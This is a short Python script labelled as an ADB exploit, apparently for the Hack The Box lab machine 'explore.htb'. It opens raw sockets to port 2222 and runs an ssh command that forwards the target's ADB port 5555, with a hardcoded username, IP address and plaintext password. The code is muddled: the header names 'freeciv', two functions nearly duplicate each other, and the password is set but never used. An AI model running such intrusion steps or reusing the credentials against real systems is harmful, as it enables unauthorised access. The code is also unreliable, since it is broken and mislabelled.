"""
Android Debug Bridge (ADB) freeciv exploit
Author : Raed-Ahsan
https://linkedin.com/in/raed-ahsan
Android 2.0 Banana Studio
"""



import socket # socket
import subprocess  # Subprocess
import time  # Time


def connection_function(host, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  print(s.recv(1024))

connection_function("explore.htb", 2222)


def adb_connection(host, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  print(s.recv(1024))

  subprocess.call(['ssh -p 2222 -L 5555:localhost:5555 kristi@10.129.218.100'], shell=True)
  password = "Kr1sT!5h@Rp3xPl0r3!"
  print(s.recv(1024))
  
adb_connection("explore.htb", 2222)
